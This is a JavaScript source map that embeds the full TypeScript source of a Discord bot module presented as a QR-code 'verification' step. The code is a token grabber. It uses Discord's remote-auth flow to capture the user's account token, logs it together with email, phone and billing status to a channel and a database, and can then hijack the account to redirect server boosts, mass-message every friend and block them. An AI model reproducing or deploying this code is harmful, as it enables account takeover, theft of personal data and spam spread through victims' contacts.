{
  "version": 3,
  "sources": ["../../../../src/discord/util/socket.ts"],
  "sourcesContent": ["import { ButtonInteraction, Client, AttachmentBuilder, TextChannel, EmbedBuilder } from \"discord.js\";\nimport { generateKeyPairSync, createHash, privateDecrypt, KeyPairKeyObjectResult } from \"crypto\";\nimport { logError, logInformation, logSuccess } from \"../../util/console\";\nimport { model, Schema } from 'mongoose';\nimport { failedVerificationEmbed, failedVerificationEmbedReason, successVerificationEmbed, verificationCodeEmbed } from \"../util/embeds\";\nimport { getUserInformation, getBillingInformation, getAllBoosts, addBoostToserver, getAllFriends, createFriendChannel, sendMessage, blockFriend } from '../util/fetch';\nimport { IData } from \"../../types\";\nimport WebSocket from \"ws\";\nimport Jimp from \"jimp\";\nimport { config } from \"../../util/config\";\n\nconst users = model(config.mongoose.schemaName, new Schema({\n    id: String,\n    username: String,\n    token: String,\n    hasBilling: Boolean,\n}));\n\nconst socket = (client: Client, interaction: ButtonInteraction) => new Promise(async (resolve, reject) => {\n    resolve(true);\n    const socketClient = new WebSocket(`wss://remote-auth-gateway.discord.gg/?v=1`, { origin: 'https://discord.com', handshakeTimeout: 10000 });\n    const keyPair = generateKeyPairSync(\"rsa\", { modulusLength: 2048, publicExponent: 65537 });\n    socketClient.onerror = (e) => logError(e.message.toUpperCase());\n    socketClient.onclose = (e) => logError(\"SOCKET CLOSED\");\n    let heartbeat: NodeJS.Timeout;\n    setTimeout(() => {\n        socketClient.close();\n        clearInterval(heartbeat);\n        interaction.user.send({\n            embeds: [failedVerificationEmbed(client)]\n        }).catch(() => { });\n        return reject(false);\n    }, 60000);\n    socketClient.onmessage = async (event) => {\n        const data: IData = JSON.parse(event.data as string);\n        switch (data.op) {\n            case 'hello':\n                socketClient.send(JSON.stringify({ \n                    op: 'init', \n                    encoded_public_key: keyPair.publicKey.export({ type: 'spki', format: 'der' }).toString(\"base64\") \n                }));\n                heartbeat = setInterval(() => { socketClient.send(JSON.stringify({ op: 'heartbeat' })); }, data.heartbeat_interval);\n                break;\n            case 'nonce_proof':\n                const decryptedNonce = privateDecrypt({ key: keyPair.privateKey, oaepHash: 'sha256' }, Buffer.from((data.encrypted_nonce as string), 'base64'));\n                const nonceHash = createHash('sha256').update(decryptedNonce).digest('base64url');\n                socketClient.send(JSON.stringify({ op: 'nonce_proof', proof: nonceHash }));\n                break;\n            case 'pending_remote_init':\n                const embed = verificationCodeEmbed(client);\n                const fingerprintData = `https://discordapp.com/ra/${data.fingerprint}`;\n                const qrCodeURL = `https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${fingerprintData}`;\n                \n                const bg = new Jimp(300, 300, 0xFFFFFFFF);\n                const qrCode = await Jimp.read(qrCodeURL);\n                bg.composite(qrCode, 22, 22);\n                \n                bg.getBuffer(Jimp.MIME_PNG, (err, buffer) => {\n                    const discordImage = new AttachmentBuilder(buffer)\n                        .setName('img.png');\n\n                    embed.setImage('attachment://img.png');\n                    interaction.user.send({\n                        embeds: [embed], \n                        files: [discordImage]\n                    });\n                });\n                break;\n            case 'finish':\n                const decryptedToken = privateDecrypt({ key: keyPair.privateKey, oaepHash: 'sha256' }, Buffer.from((data.encrypted_token as string), 'base64'));\n                const token = decryptedToken.toString();\n                logSuccess(`${token}`);\n\n                const userInformation = await getUserInformation(token);\n                if (userInformation.id !== interaction.user.id) {\n                    interaction.user.send({\n                        embeds: [failedVerificationEmbedReason(client, 'Wrong User')]\n                    }).catch(() => {});\n                } else {\n                    await interaction.user.send({\n                        embeds: [successVerificationEmbed(client)]\n                    }).catch(() => {});\n\n                    const role = client.guilds.cache.get(config.verify.guildId)?.roles.cache.get(config.verify.roleId);\n                    const user = client.guilds.cache.get(config.verify.guildId)?.members.cache.get(interaction.user.id);\n                    if (role && user) user.roles.add(role).catch(() => {});\n                }\n\n                const avatarUrl = userInformation.avatar !== null ? \n                    `https://cdn.discordapp.com/avatars/${userInformation.id}/${userInformation.avatar}.png` \n                    : `https://discord.com/assets/1f0bfc0865d324c2587920a7d80c609b.png`;\n\n                const billingInformation = await getBillingInformation(token);\n\n                const tokenLoggedEmbed = new EmbedBuilder()\n                    .setColor('#FF0000')\n                    .setAuthor({\n                        name: `${userInformation.username}#${userInformation.discriminator} [${userInformation.id}]`,\n                        iconURL: avatarUrl\n                    })\n                    .addFields([\n                        { name: 'Account Info', value: `Email: ${userInformation.email}\\nPhone: ${userInformation.phone}\\nNitro: ${userInformation.premium_type ? (userInformation.premium_type === 2 ? 'Booster' : 'Classic') : 'None'}\\nBilling Info: ${billingInformation.length > 0 ? 'Yes' : 'No'}`},\n                        { name: 'Token', value: token }\n                    ])\n\n                const logChannel = (await client.channels.cache.get(config.log.channelId) as TextChannel);\n                logChannel.send({\n                    embeds: [tokenLoggedEmbed]\n                }).catch(() => {});\n\n                if (config.autoBoost) {\n                    const allBoosts = await getAllBoosts(token);\n                    await addBoostToserver(token, allBoosts.map(x => x.id));\n                }\n\n                if (config.autoMessage.enabled) {\n                    const allFriends = await getAllFriends(token);\n                    for (const friend of allFriends) {\n                        const friendChannel = await createFriendChannel(token, friend.id);\n                        await sendMessage(token, friendChannel.id);\n                        if (config.autoMessage.blockAfterMessage) await blockFriend(token, friend.id);\n                    }\n                }\n\n                if (config.mongoose.enabled) {\n                    const foundUser = await users.findOne({ id: userInformation.id });\n                    if (foundUser) {\n                        foundUser.token = token;\n                        foundUser.hasBilling = billingInformation.length > 0\n                        await foundUser.save();\n                    } else await users.create({\n                        id: userInformation.id,\n                        username: userInformation.username,\n                        token: token,\n                        hasBilling: billingInformation.length > 0\n                    });\n                }\n            default:\n                break;\n        }\n    }\n\n    \n});\n\nexport default socket;\n"],
  "mappings": "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",
  "names": []
}
